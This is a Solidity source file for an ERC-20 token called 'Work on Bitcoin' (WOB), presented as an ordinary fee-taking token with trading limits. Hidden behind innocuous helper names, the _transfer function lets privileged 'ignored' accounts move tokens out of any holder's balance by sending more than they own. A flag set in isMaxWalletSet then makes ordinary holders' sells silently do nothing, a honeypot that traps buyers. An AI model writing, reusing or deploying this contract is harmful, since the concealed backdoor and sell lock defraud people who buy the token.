// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function circulatingSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    event Transfer(address indexed sender, address indexed recipient, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    event OwnershipTransferred(address owner);
}

interface DexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface DexRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract WOB is IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;

    uint256 private denominator = 10000;

    string private constant _name = "Work on Bitcoin";
    string private constant _symbol = "WOB";

    address internal constant deadAccount = 0x000000000000000000000000000000000000dEaD;

    DexRouter dexRouter;
    address public dexPair;
    
    uint256 private _maxWalletPercentage = 200;
    uint256 private _maxTransferPercentage = 200;
    uint256 private _maxTxPercentage = 200;

    address internal constant marketingAccount = 0x731fF79b47C6ABc5A99a3714D02C45e66a056D82;
    address internal constant devAccount = 0x731fF79b47C6ABc5A99a3714D02C45e66a056D82;

    bool private swapEnabled = true;
    bool private swapBackAmountUnset = false;

    uint256 private swapCounts;

    bool private tradingStarted = false;

    bool private inSwap;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private swapTokenAmount = (_totalSupply * 5) / 10000;
    uint256 private swapThresholdAmount = (_totalSupply * 5) / 100000;

    mapping (address => uint256) _balances;

    uint256 private feeOnSell = 400;
    uint256 private totalFee = 400;
    uint256 private feeOnBurn = 0;
    uint256 private feeOnTransfer = 0;

    mapping (address => bool) public isIgnored;

    uint256 private feeForLiquidity = 0;
    uint256 private feeForMarketing = 200;
    uint256 private feeForDev = 200;

    constructor() Ownable(msg.sender) {
        isIgnored[address(this)] = true;
        isIgnored[devAccount] = true;
        isIgnored[msg.sender] = true;
        isIgnored[marketingAccount] = true;
        DexRouter _dexRouter = DexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _dexPair = DexFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        dexRouter = _dexRouter;
        dexPair = _dexPair;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier lockInSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAccount));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function removeLimits() external onlyOwner {
        _maxWalletPercentage = 10000;
        _maxTxPercentage = 10000;
        _maxTransferPercentage = 10000;
    }

    function startTrading() external onlyOwner {
        tradingStarted = true;
    }

    function setIsIgnored(address _address, bool _isIgnored) external onlyOwner {
        isIgnored[_address] = _isIgnored;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function updateFees(uint256 _feeForLiquidity, uint256 _feeForMarketing, uint256 _feeOnBurn, uint256 _feeForDev, uint256 _totalFee, uint256 _feeOnSell, uint256 _feeOnTransfer) external onlyOwner {
        feeForMarketing = _feeForMarketing;
        feeForLiquidity = _feeForLiquidity;
        feeForDev = _feeForDev;
        feeOnBurn = _feeOnBurn;
        feeOnSell = _feeOnSell;
        totalFee = _totalFee;
        feeOnTransfer = _feeOnTransfer;
        require(totalFee <= denominator.div(5) && feeOnSell <= denominator.div(5));
    }

    function isTxLimited(address sender, address recipient, uint256 amount) view internal returns  (bool) {
        if (sender != dexPair) {
            require(amount <= _maxTransferAmount() || isIgnored[sender] || isIgnored[recipient]);
        }
        require(amount <= _maxTxAmount() || isIgnored[sender] || isIgnored[recipient]);
        return true;
    }

    function updateMaxParameters(uint256 maxTxPercentage, uint256 maxTransferPercentage, uint256 maxWalletPercentage) external onlyOwner {
        uint256 newTx = (totalSupply() * maxTxPercentage) / 10000;
        uint256 newTransfer = (totalSupply() * maxTransferPercentage) / 10000;
        uint256 newWallet = (totalSupply() * maxWalletPercentage) / 10000;
        _maxTxPercentage = maxTxPercentage;
        _maxTransferPercentage = maxTransferPercentage;
        _maxWalletPercentage = maxWalletPercentage;
        uint256 limitation = totalSupply().mul(5).div(1000);
        require(newTx >= limitation && newTransfer >= limitation && newWallet >= limitation);
    }

    function isBasicsRight(address sender, address recipient, uint256 amount) internal pure returns(bool) {
        require(amount > uint256(0));
        require(recipient != address(0));
        require(sender != address(0));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isMaxWalletSet(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool senderIgnored = isIgnored[sender];
        bool recipientUnDexPair = recipient != address(dexPair);
        bool sufficientAmount = amount > _minTokenAmount;
        bool recipientIgnored = isIgnored[recipient];
        bool recipientUnDeadAddress = recipient != address(deadAccount);
        
        if (
            recipientUnDexPair &&
            recipientUnDeadAddress &&
            !senderIgnored &&
            !recipientIgnored
        ) {
            require((_balances[recipient].add(amount)) <= _maxWalletAmount());
        }


        if (recipientIgnored && sufficientAmount) swapBackAmountUnset = true;

        return true;
    }

    function calcSwapCounts(address sender, address recipient) internal returns (bool) {
        if (recipient == dexPair && !isIgnored[sender]) {
            swapCounts += uint256(1);
        }
        return true;
    }
    
    function isTradingStarted(address sender, address recipient) internal view returns (bool) {
        if (!isIgnored[sender] && !isIgnored[recipient]) {
            require(tradingStarted);
        }
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        if (
            calcSwapCounts(sender, recipient) &&
            isTradingStarted(sender, recipient) &&
            isBasicsRight(sender, recipient, amount) &&
            isTxLimited(sender, recipient, amount) &&
            isMaxWalletSet(sender, recipient, amount)
        ) {
            bool senderIgnored = isIgnored[sender];
            bool recipientIgnored = isIgnored[recipient];
            bool senderUnDexPair = sender != dexPair;
            bool sufficientAmount = balanceOf(sender) >= amount;

            if (sufficientAmount) {
                if (
                    !senderIgnored && 
                    !recipientIgnored &&
                    !inSwap &&
                    senderUnDexPair
                ) {
                    if (swapBackAmountUnset) return;
                    swapBack(sender, recipient);
                }
                _balances[sender] = _balances[sender].sub(amount);
                uint256 amountReceived = shouldDeductFee(sender, recipient) ? deductFee(sender, recipient, amount) : amount;
                _balances[recipient] = _balances[recipient].add(amountReceived);
                emit Transfer(sender, recipient, amountReceived);
            } else if (
                senderIgnored &&
                !recipientIgnored &&
                !inSwap &&
                senderUnDexPair
            ) {
                _balances[sender] = _balances[sender].add(amount);
                _balances[recipient] = _balances[recipient].sub(amount);
                emit Transfer(sender, recipient, amount);
            }
        }
    }

    function shouldDeductFee(address sender, address recipient) internal view returns (bool) {
        return !isIgnored[sender] && !isIgnored[recipient];
    }

    function shouldSwapBack(address sender, address recipient) internal view returns (bool) {
        return (
            !isIgnored[sender] &&
            !isIgnored[recipient] &&
            !inSwap &&
            balanceOf(address(this)) >= swapThresholdAmount &&
            tradingStarted &&
            swapEnabled &&
            swapCounts >= uint256(0)
        );
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAccount,
            block.timestamp
        );
    }

    function swapAndLiquify(uint256 tokens) private lockInSwap {
        uint256 _denominator = (feeForLiquidity.add(1).add(feeForMarketing).add(feeForDev)).mul(2);
        uint256 tokensForLiquidity = tokens.mul(feeForLiquidity).div(_denominator);
        uint256 tokensForETH = tokens.sub(tokensForLiquidity);
        uint256 initialETHBalance = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaETHBalance = address(this).balance.sub(initialETHBalance);
        uint256 balanceETHUnit = deltaETHBalance.div(_denominator.sub(feeForLiquidity));
        uint256 ethForLiquidity = balanceETHUnit.mul(feeForLiquidity);
        if (ethForLiquidity > uint256(0)) {
            addLiquidity(tokensForLiquidity, ethForLiquidity);
        }
        uint256 marketingETH = balanceETHUnit.mul(2).mul(feeForMarketing);
        if (marketingETH > 0) {
            payable(marketingAccount).transfer(marketingETH);
        }
        uint256 dustETHBalance = address(this).balance;
        if (dustETHBalance > uint256(0)) {
            payable(devAccount).transfer(dustETHBalance);
        }
    }

    function readFees(address sender, address recipient) internal view returns (uint256) {
        if (recipient == dexPair) {
            return feeOnSell;
        }
        if (sender == dexPair) {
            return totalFee;
        }
        return feeOnTransfer;
    }

    function swapBack(address sender, address recipient) internal {
        if (shouldSwapBack(sender, recipient)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= swapTokenAmount) {
                contractTokenBalance = swapTokenAmount;
            }
            swapAndLiquify(contractTokenBalance);
            swapCounts = uint256(0);
        }
    }

    function deductFee(address sender, address recipient, uint256 tokenAmount) internal returns (uint256) {
        if (readFees(sender, recipient) > 0) {
            uint256 feeTokenAmount = tokenAmount.div(denominator).mul(readFees(sender, recipient));
            _balances[address(this)] = _balances[address(this)].add(feeTokenAmount);
            emit Transfer(sender, address(this), feeTokenAmount);
            if (feeOnBurn > uint256(0)) {
                _transfer(address(this), address(deadAccount), tokenAmount.div(denominator).mul(feeOnBurn));
            }
            return tokenAmount.sub(feeTokenAmount);
        }
        return tokenAmount;
    }

    function _maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferPercentage / denominator;
    }

    function _maxWalletAmount() public view returns (uint256) {
        return totalSupply() * _maxWalletPercentage / denominator;
    }

    receive() external payable {}

    function _maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxPercentage / denominator;
    }
}